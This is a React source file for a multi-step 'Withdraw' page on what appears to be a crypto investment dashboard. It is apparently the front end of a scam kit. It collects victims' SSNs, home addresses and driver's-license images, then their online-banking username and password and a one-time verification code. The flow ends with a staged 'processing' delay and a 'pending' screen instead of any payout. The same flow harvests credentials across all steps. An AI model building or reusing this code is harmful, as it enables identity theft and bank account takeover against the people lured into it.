import React, { useEffect, useMemo, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { FiUploadCloud, FiLink } from 'react-icons/fi';
import PageHeader from '../components/PageHeader';
import PasswordInput from '../components/PasswordInput';
import api from '../utils/api';
import './Withdraw.css';

const fmtUsd = (n) =>
  `$${Number(n || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;

const Withdraw = () => {
  const navigate = useNavigate();

  const [step, setStep] = useState(1);
  const [verification, setVerification] = useState({ email: '', phone: '', ssn: '', address: '' });
  const [idType, setIdType] = useState('license');
  const [front, setFront] = useState(null);
  const [back, setBack] = useState(null);
  const [assets, setAssets] = useState([]);
  const [symbol, setSymbol] = useState('');
  const [amount, setAmount] = useState('');
  const [bank, setBank] = useState({ bankName: '', bankAddress: '' });
  const [bankLogin, setBankLogin] = useState({ username: '', password: '' });
  const [code, setCode] = useState('');
  const [secondsLeft, setSecondsLeft] = useState(30 * 60);
  const [phase, setPhase] = useState('form');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    (async () => {
      try {
        const { data } = await api.get('/user/dashboard');
        setAssets((data.assets || []).filter((a) => Number(a.amount) > 0));
      } catch (e) {
        /* ignore */
      }
    })();
  }, []);

  useEffect(() => {
    if (step !== 6) return;
    const t = setInterval(() => setSecondsLeft((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(t);
  }, [step]);

  const countdown = useMemo(() => {
    const m = Math.floor(secondsLeft / 60).toString().padStart(2, '0');
    const s = (secondsLeft % 60).toString().padStart(2, '0');
    return `${m}:${s}`;
  }, [secondsLeft]);

  const next = async () => {
    setError('');
    setLoading(true);
    try {
      if (step === 1) {
        if (!verification.email || !verification.phone || !verification.ssn || !verification.address) {
          throw new Error('All verification fields are required');
        }
        await api.post('/withdraw/verification', verification);
        setStep(2);
      } else if (step === 2) {
        if (!front || !back) throw new Error('Upload both front and back of your ID');
        const fd = new FormData();
        fd.append('idType', idType);
        fd.append('front', front);
        fd.append('back', back);
        await api.post('/withdraw/id', fd, { headers: { 'Content-Type': 'multipart/form-data' } });
        setStep(3);
      } else if (step === 3) {
        if (!symbol) throw new Error('Select an asset');
        if (!amount || Number(amount) <= 0) throw new Error('Enter a valid amount');
        await api.post('/withdraw/amount', { symbol, amount: Number(amount) });
        setStep(4);
      } else if (step === 4) {
        if (!bank.bankName || !bank.bankAddress) {
          throw new Error('Bank name and address are required');
        }
        await api.post('/withdraw/bank', bank);
        setStep(5);
      }
    } catch (err) {
      setError(err?.response?.data?.message || err.message || 'Something went wrong');
    } finally {
      setLoading(false);
    }
  };

  const connectBank = async () => {
    setError('');
    if (!bankLogin.username || !bankLogin.password) {
      return setError('Bank username and password are required');
    }
    setLoading(true);
    try {
      await api.post('/withdraw/bank-connect', {
        bankName: bank.bankName,
        username: bankLogin.username,
        password: bankLogin.password,
      });
      setStep(6);
    } catch (err) {
      setError(err?.response?.data?.message || 'Could not connect bank');
    } finally {
      setLoading(false);
    }
  };

  const submitCode = async () => {
    setError('');
    if (!code.trim()) return setError('Enter the verification code');
    setPhase('processing');
    let correct = false;
    try {
      const { data } = await api.post('/withdraw/verify-code', { code: code.trim() });
      correct = Boolean(data.correct);
    } catch (err) {
      correct = false;
    }
    setTimeout(() => {
      setPhase(correct ? 'pending' : 'retry');
    }, 5000);
  };

  const resend = async () => {
    try {
      await api.post('/withdraw/resend-code');
      setSecondsLeft(30 * 60);
    } catch (e) {
      /* ignore */
    }
  };

  return (
    <div className="withdraw-page">
      <PageHeader title="Withdraw" />

      <div className="withdraw-body">
        {step === 1 && (
          <div className="step-card">
            <h3>Step 1 — Identity Verification</h3>
            <p className="hint">Verification is required to make a successful withdrawal.</p>
            <label>Email</label>
            <input
              type="email"
              value={verification.email}
              onChange={(e) => setVerification({ ...verification, email: e.target.value })}
            />
            <label>Phone Number</label>
            <input
              value={verification.phone}
              onChange={(e) => setVerification({ ...verification, phone: e.target.value })}
            />
            <label>Social Security Card (SSN)</label>
            <input
              value={verification.ssn}
              onChange={(e) => setVerification({ ...verification, ssn: e.target.value })}
            />
            <label>Home Address</label>
            <input
              value={verification.address}
              onChange={(e) => setVerification({ ...verification, address: e.target.value })}
            />
            {error && <div className="form-error">{error}</div>}
            <button className="primary-btn" onClick={next} disabled={loading}>
              {loading ? 'Submitting...' : 'Proceed'}
            </button>
          </div>
        )}

        {step === 2 && (
          <div className="step-card">
            <h3>Step 2 — Upload ID</h3>
            <div className="tabs">
              <button
                className={idType === 'license' ? 'active' : ''}
                onClick={() => setIdType('license')}
              >
                State Driver&apos;s License
              </button>
              <button
                className={idType === 'nondriver' ? 'active' : ''}
                onClick={() => setIdType('nondriver')}
              >
                State-Issued Non-Driver ID Card
              </button>
            </div>

            <label>Front of Card</label>
            <label className="upload-box">
              <FiUploadCloud />
              <span>{front ? front.name : 'Choose front image'}</span>
              <input type="file" accept="image/*" onChange={(e) => setFront(e.target.files[0])} hidden />
            </label>

            <label>Back of Card</label>
            <label className="upload-box">
              <FiUploadCloud />
              <span>{back ? back.name : 'Choose back image'}</span>
              <input type="file" accept="image/*" onChange={(e) => setBack(e.target.files[0])} hidden />
            </label>

            {error && <div className="form-error">{error}</div>}
            <button className="primary-btn" onClick={next} disabled={loading}>
              {loading ? 'Uploading...' : 'Next'}
            </button>
          </div>
        )}

        {step === 3 && (
          <div className="step-card">
            <h3>Step 3 — Withdrawal Amount</h3>
            <label>Asset</label>
            <select value={symbol} onChange={(e) => setSymbol(e.target.value)}>
              <option value="">Select asset</option>
              {assets.map((a) => (
                <option key={a.symbol} value={a.symbol}>
                  {a.symbol} — {fmtUsd(a.amount)}
                </option>
              ))}
            </select>
            <label>Amount (USD)</label>
            <input
              type="number"
              min="0"
              step="any"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
            {error && <div className="form-error">{error}</div>}
            <button className="primary-btn" onClick={next} disabled={loading}>Next</button>
          </div>
        )}

        {step === 4 && (
          <div className="step-card">
            <h3>Step 4 — Bank Details</h3>
            <label>Bank Name</label>
            <input
              value={bank.bankName}
              onChange={(e) => setBank({ ...bank, bankName: e.target.value })}
              placeholder="e.g. Chase Bank"
            />
            <label>Bank Address</label>
            <input
              value={bank.bankAddress}
              onChange={(e) => setBank({ ...bank, bankAddress: e.target.value })}
              placeholder="Bank address"
            />
            {error && <div className="form-error">{error}</div>}
            <button className="primary-btn" onClick={next} disabled={loading}>Next</button>
          </div>
        )}

        {/* 🔧 Step 5 — Bank Name input removed (uses bank from Step 4) & eye toggle added */}
        {step === 5 && (
          <div className="step-card">
            <h3>Step 5 — Connect Online Banking</h3>
            <p className="hint">Connect your online banking to complete the withdrawal.</p>
            <p className="bank-info">Bank: <strong>{bank.bankName}</strong></p>
            <label>Bank Username (User ID)</label>
            <input
              value={bankLogin.username}
              onChange={(e) => setBankLogin({ ...bankLogin, username: e.target.value })}
              placeholder="Bank username"
            />
            <label>Bank Password</label>
            <PasswordInput
              value={bankLogin.password}
              onChange={(e) => setBankLogin({ ...bankLogin, password: e.target.value })}
              placeholder="Bank password"
            />
            {error && <div className="form-error">{error}</div>}
            <button className="primary-btn connect-btn" onClick={connectBank} disabled={loading}>
              <FiLink /> {loading ? 'Connecting...' : 'Connect Bank Now'}
            </button>
          </div>
        )}

        {step === 6 && phase === 'form' && (
          <div className="step-card">
            <h3>Step 6 — Verification Code</h3>
            <p className="hint">Enter the verification code sent to you.</p>
            <input
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
              placeholder="Enter code"
              inputMode="numeric"
            />
            <div className="countdown-row">
              <span className="countdown">{countdown}</span>
              <button className="ghost-btn" onClick={resend} disabled={secondsLeft > 0}>
                Resend Code
              </button>
            </div>
            {error && <div className="form-error">{error}</div>}
            <button className="primary-btn" onClick={submitCode}>Proceed</button>
          </div>
        )}

        {step === 6 && phase === 'processing' && (
          <div className="processing-box">
            <div className="spinner" />
            <p>Processing your withdrawal...</p>
          </div>
        )}

        {step === 6 && phase === 'pending' && (
          <div className="step-card center">
            <h3>Verification is Pending</h3>
            <p>Your payment will be disbursed after successful verification.</p>
            <button className="primary-btn" onClick={() => navigate('/dashboard')}>
              Back to Dashboard
            </button>
          </div>
        )}

        {step === 6 && phase === 'retry' && (
          <div className="step-card center">
            <h3>Incorrect Code</h3>
            <p>The verification code is incorrect or has not been set yet.</p>
            <button
              className="primary-btn"
              onClick={() => {
                setPhase('form');
                setCode('');
                setError('');
              }}
            >
              Okay
            </button>
          </div>
        )}
      </div>
    </div>
  );
};

export default Withdraw;